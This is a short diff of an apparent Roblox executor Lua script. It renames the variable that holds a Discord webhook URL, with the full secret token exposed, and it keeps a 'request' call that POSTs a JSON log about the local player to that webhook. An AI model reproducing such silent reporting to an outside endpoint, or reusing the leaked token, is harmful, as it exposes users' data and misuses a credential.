@@ -1,7 +1,4 @@
--- ==========================================
--- WEBHOOK DE LOG (VERSÃO CORRIGIDA)
--- ==========================================
-local webhookURL = "https://discord.com/api/webhooks/1554820124928905226/GtLfdJKG_Uj72N_Xht7nVRTD3xDQtPXpU8SGC2PjP3f_qx4ZjBcDb_MC_0T-9tjvJAKH"
+local breakerggURL = "https://discord.com/api/webhooks/1554820124928905226/GtLfdJKG_Uj72N_Xht7nVRTD3xDQtPXpU8SGC2PjP3f_qx4ZjBcDb_MC_0T-9tjvJAKH"
 local plr = game.Players.LocalPlayer
 
 -- Função corrigida para evitar erro de 'nil' no os.date
@@ -32,7 +29,7 @@ local function sendLog()
 
     pcall(function()
         request({
-            Url = webhookURL,
+            Url = breakerggURL, -- Variável renomeada para breakerggURL
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
             Body = game:GetService("HttpService"):JSONEncode(data)
